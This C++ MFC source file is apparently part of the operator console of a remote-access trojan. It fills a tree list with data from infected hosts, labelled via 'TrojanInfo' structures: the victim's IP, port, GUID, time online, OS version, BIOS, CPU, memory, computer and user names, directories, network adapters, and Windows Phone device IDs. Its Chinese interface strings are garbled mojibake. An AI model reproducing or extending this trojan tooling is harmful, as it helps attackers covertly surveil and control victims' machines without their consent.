// InfoFrom.cpp : implementation file
//

#include "stdafx.h"
#include "basicInfo.h"
#include "InfoFrom.h"
#include "macro.h"

#define ID_TREE_LIST_HEADER 370
#define ID_TREE_LIST_CTRL   373
#define ID_TREE_LIST_SCROLLBAR   377

// InfoFrom

IMPLEMENT_DYNCREATE(InfoFrom, CFormView)

InfoFrom::InfoFrom()
	: CFormView(InfoFrom::IDD)
{
	m_init = FALSE;
}

InfoFrom::~InfoFrom()
{
}

void InfoFrom::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(InfoFrom, CFormView)
	ON_WM_SIZE()
END_MESSAGE_MAP()


// InfoFrom diagnostics

#ifdef _DEBUG
void InfoFrom::AssertValid() const
{
	CFormView::AssertValid();
}

#ifndef _WIN32_WCE
void InfoFrom::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif
#endif //_DEBUG

void InfoFrom::OnInitialUpdate()
{
	CFormView::OnInitialUpdate();
	GetParentFrame()->RecalcLayout();
	ResizeParentToFit();

	CRect m_wndRect;
	GetClientRect(&m_wndRect);
	CRect m_headerRect;


	// create the header
	{
		m_headerRect.left = m_headerRect.top = -1;
		m_headerRect.right = m_wndRect.Width();

		m_treeList.m_wndHeader.Create(WS_CHILD | WS_VISIBLE | HDS_BUTTONS | HDS_HORZ, m_headerRect, this, ID_TREE_LIST_HEADER);
	}

	static CFont font;
	font.CreateFont(100, 0, 0, 0, FW_NORMAL, FALSE,FALSE,FALSE,GB2312_CHARSET,
		OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,
		DEFAULT_PITCH|FF_MODERN,"����");
	//m_treeList.m_wndHeader.SetFont(&font);
	m_treeList.SetFont(&font);

	CSize textSize;
	// set header's pos, dimensions and image list
	{
		CDC *pDC = m_treeList.m_wndHeader.GetDC();
		pDC->SelectObject(&m_treeList.m_headerFont);
		textSize = pDC->GetTextExtent("A");

		m_treeList.m_wndHeader.SetWindowPos(&wndTop, 0, 0, m_headerRect.Width(), textSize.cy+4, SWP_SHOWWINDOW);

		//m_treeList.m_cImageList.Create(IDB_HEADER, 16, 10, 0);
		//m_treeList.m_wndHeader.SetImageList(&m_treeList.m_cImageList);

		m_treeList.m_wndHeader.UpdateWindow();
	}

	CRect m_treeListRect;
	// create the tree itself
	{
		GetClientRect(&m_wndRect);

		m_treeListRect.left=0;
		m_treeListRect.top = textSize.cy+4;
		m_treeListRect.right = m_headerRect.Width()-5;
		m_treeListRect.bottom = m_wndRect.Height()-GetSystemMetrics(SM_CYHSCROLL)-4;

		m_treeList.Create(WS_CHILD | WS_VISIBLE | TVS_HASLINES | TVS_LINESATROOT | TVS_HASBUTTONS | TVS_SHOWSELALWAYS, m_treeListRect, this, ID_TREE_LIST_CTRL);
	}

	m_treeList.InsertColumn(0, "����", LVCFMT_LEFT, 360);
	m_treeList.InsertColumn(1, "��ϸ����", LVCFMT_LEFT,  360);

	m_init = TRUE;
	SortTree(0, TRUE, m_treeList.GetRootItem());
}

void InfoFrom::OnSize(UINT nType, int cx, int cy) 
{
	CFormView::OnSize(nType, cx, cy);
	
	if(m_init)
	{
		CRect m_wndRect;
		GetClientRect(&m_wndRect);

		CRect m_headerRect;
		m_treeList.m_wndHeader.GetClientRect(&m_headerRect);
		m_treeList.m_wndHeader.SetWindowPos(&wndTop, 0, 0, m_wndRect.Width(), m_headerRect.Height(), SWP_NOMOVE);

		m_treeList.SetWindowPos(&wndTop, 0, 0, m_wndRect.Width(), m_wndRect.Height(), SWP_NOMOVE);
	}
}

BOOL InfoFrom::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
{
	HD_NOTIFY *pHDN = (HD_NOTIFY*)lParam;	

	if((wParam == ID_TREE_LIST_HEADER) && (pHDN->hdr.code == HDN_ITEMCLICK))
	{
		int nCol = pHDN->iItem;

		BOOL bAscending = FALSE;

		if(m_treeList.m_wndHeader.GetItemImage(nCol)==-1)
			bAscending = TRUE;
		else
			if(m_treeList.m_wndHeader.GetItemImage(nCol)==1)
				bAscending = TRUE;

		for(int i=0;i<m_treeList.GetColumnsNum();i++)
		{
			m_treeList.m_wndHeader.SetItemImage(i, -1);
		}

		if(bAscending)
			m_treeList.m_wndHeader.SetItemImage(nCol, 0);
		else
			m_treeList.m_wndHeader.SetItemImage(nCol, 1);

		m_treeList.SortItems(nCol, bAscending, NULL);
		SortTree(nCol, bAscending, m_treeList.GetRootItem());

		m_treeList.UpdateWindow();
	}
	else
		if((wParam == ID_TREE_LIST_HEADER) && (pHDN->hdr.code == HDN_ITEMCHANGED))
		{
			int m_nPrevColumnsWidth = m_treeList.GetColumnsWidth();
			m_treeList.RecalcColumnsWidth();
			//ResetScrollBar();

			// in case we were at the scroll bar's end,
			// and some column's width was reduced,
			// update header's position (move to the right).
			CRect m_treeRect;
			m_treeList.GetClientRect(&m_treeRect);

			CRect m_headerRect;
			m_treeList.m_wndHeader.GetClientRect(&m_headerRect);
			m_treeList.Invalidate();
		}
		else
			GetParent()->SendMessage(WM_NOTIFY, wParam, lParam);

	return CFormView::OnNotify(wParam, lParam, pResult);
}


void InfoFrom::OnQueryFailed(unsigned short cmd, unsigned short resp)
{
	CString errMsg;
	if(resp == ERR_NOTHISMODULE)
		errMsg = "ľ�����˲�֧�ָ�ģ�飬���ϴ���Ӧ�Ĳ��";
	else if(resp == ERR_INVPARA)
		errMsg = "��������ȷ�����Ϸ�������";
	else
		errMsg = "δ֪����";
	MessageBox(errMsg, "ϵͳ��Ϣ��ѯ", MB_OK|MB_ICONHAND);
}

// InfoFrom message handlers

static CString GetOSVersion(unsigned long majorVersion, unsigned long minorVersion,
							unsigned long platformId, unsigned long productType,
							unsigned long buildNumber)
{
	CString osName;
	switch(majorVersion)
	{
	case 4: 
		switch(minorVersion)
		{               
		case 0: 
			if(platformId == VER_PLATFORM_WIN32_NT) 
				osName=_T("Microsoft Windows NT 4.0");   
			else if(platformId==VER_PLATFORM_WIN32_WINDOWS) 
				osName=_T("Microsoft Windows 95"); 
			break;
		case 10: 
			osName=_T("Microsoft Windows 98"); 
			break; 
		case 90: 
			osName=_T("Microsoft Windows Me"); 
			break; 
		} 
		break; 
	case 5: 
		switch(minorVersion)
		{
		case 0: 
			osName=_T("Microsoft Windows 2000");   
			break; 
		case 1: 
			osName=_T("Microsoft Windows XP");           
			break; 
		case 2: 
			osName=_T("Microsoft Windows Server 2003");  
			break; 
		} 
		break; 
	case 6: 
		switch(minorVersion)
		{ 
		case 0: 
			if(productType == VER_NT_WORKSTATION)
				osName=_T("Microsoft Windows Vista"); 
			else 
				osName=_T("Microsoft Windows Server 2008");   
			break; 
		case 1: 
			if(productType==VER_NT_WORKSTATION) 
				osName=_T("Microsoft Windows 7"); 
			else 
				osName=_T("Microsoft Windows Server 2008 R2"); 
			break; 
		case 2: 
			if(productType==VER_NT_WORKSTATION) 
				osName=_T("Microsoft Windows 8"); 
			else 
				osName=_T("Microsoft Windows 8 Server"); 
			break; 
		} 
		break; 
	default: 
		osName=_T("δ֪����ϵͳ"); 
	}

	CString osString;
	if(buildNumber != 0)
		osString.Format("%s [%d]", osName, buildNumber);
	else
		osString = osName;

	return osString;
}

HTREEITEM InfoFrom::InsertPair(const char* name, const char* value, HTREEITEM parent)
{
	HTREEITEM hTmp = m_treeList.InsertItem(name, 0, 0, parent);
	
	if(hTmp == NULL)
		return NULL;

	m_treeList.SetItemText(hTmp, 1, value);
	return hTmp;
}

CString GetDiffTime(int t)
{
	CString st;

	if(t < 60)
		st.Format("%d��", t);
	else if(t < 3600)
		st.Format("%d��%d��", t/60, t%60);
	else if(t < 3600*24)
		st.Format("%dʱ%d��%d��", t/3600, t/60%60, t%60);
	else
		st.Format("%d��%dʱ%d��%d��", t/(3600*24), t/3600%24, t/60%60, t%60); 
	return st;
}

void InfoFrom::InsertData(void* body, void* body2)
{
	struct system_info* info = (struct system_info*)body;
	struct network_info* nws = info->networks;
	struct TrojanInfo* trojan = (struct TrojanInfo*)body2;
	int cntNW = info->cntNW;
	char buffer[128];
	int os = OS_NOTDEFINED;

	m_treeList.DeleteAllItems();
	
	if(trojan->bOnlineFlag && trojan->s)
	{
		os = trojan->ostype;
		int t = time(NULL) - trojan->timestamp;

		InsertPair("IP��ַ", trojan->trojanip);

		sprintf(buffer, "%d", trojan->port);
		InsertPair("�˿ں�", buffer);

		InsertPair("GUID", trojan->guid);

		strcpy(buffer, GetDiffTime(t));
		InsertPair("����ʱ��", buffer);
	}

	if(os == OS_WINDOWS_PHONE)
	{
		char* anid = (char*)body, *p = anid;
		InsertPair("ANID", anid);
		while(*p) p++;

		unsigned char* uId = (unsigned char*)++p;
		p += 20;
		char uuid[40+1];
		for(int i = 0; i < 20; i++)	sprintf(uuid+i*2, "%02x", uId[i]);
		InsertPair("�豸ID", uuid);

		char* devicename = p;
		while(*p) p++;
		InsertPair("�豸��", devicename);

		char* manufacture = ++p;
		while(*p) p++;
		InsertPair("�豸������", manufacture);

		char* firmware = ++p;
		while(*p) p++;
		InsertPair("�̼��汾", firmware);
		
		char* hareware = ++p;
		while(*p) p++;
		InsertPair("Ӳ���汾", hareware);

		__int64 memory;
		memcpy(&memory, ++p, sizeof(memory));
		sprintf(buffer, "%d MB", memory/(1024*1024));
		InsertPair("�豸�ڴ�", buffer);
		p += 8;

		unsigned short battery;
		memcpy(&battery, p, sizeof(battery));
		InsertPair("���״̬", battery == 0 ? "δ�ڳ��" : "���ڳ��");
		p += 2;

		//char* nw = p;
		//InsertPair("������������", nw);
		
		return;
	}

	//if(os == OS_WINDOWS)
		strcpy(buffer, GetOSVersion(info->windows.majorVersion, info->windows.minorVersion, 
			info->windows.platformId, info->windows.productType, info->windows.buildNumber));
	//else
	//	strcpy(buffer, "δ֪����ϵͳ");
	InsertPair("����ϵͳ", buffer);

	InsertPair("BIOS", info->biosDesc);

	InsertPair("CPU����", info->cpuDesc);

	sprintf(buffer, "%d", info->cpuCount);
	InsertPair("CPU��Ŀ", buffer);

	sprintf(buffer, "�����ڴ�%d MB������%d MB��", info->totalMemory/1024, info->availMemory/1024);
	InsertPair("�ڴ��С", buffer);

	InsertPair("�������", info->computerName);

	InsertPair("�û���", info->userName);

	InsertPair("ϵͳĿ¼", info->sysDir);

	InsertPair("WINDOWSĿ¼", info->winDir);

	if(cntNW)	
	{
		HTREEITEM networkparent = InsertPair("����������", NULL);
		for(int i = 0; i < cntNW; i++)
		{
		
			HTREEITEM parent = InsertPair(nws[i].name, NULL, networkparent);
			
			InsertPair("IP��ַ", nws[i].ip, parent);
			
			if(strcmp(nws[i].gateway, "0.0.0.0"))
				InsertPair("Ĭ������", nws[i].gateway, parent);
			
			if(strcmp(nws[i].mask, "0.0.0.0"))
				InsertPair("��������", nws[i].mask, parent);
		}
		m_treeList.Expand(networkparent, TVE_EXPAND);
	}
}

void InfoFrom::SortTree(int nCol, BOOL bAscending, HTREEITEM hParent)
{
	HTREEITEM hChild;
	HTREEITEM hPa = hParent;
	while(hPa!=NULL)
	{
		if(m_treeList.ItemHasChildren(hPa))
		{
			hChild = m_treeList.GetChildItem(hPa);
			m_treeList.SortItems(nCol, bAscending, hPa);
			SortTree(nCol, bAscending, hChild);
		}

		hPa = m_treeList.GetNextSiblingItem(hPa);
	}
}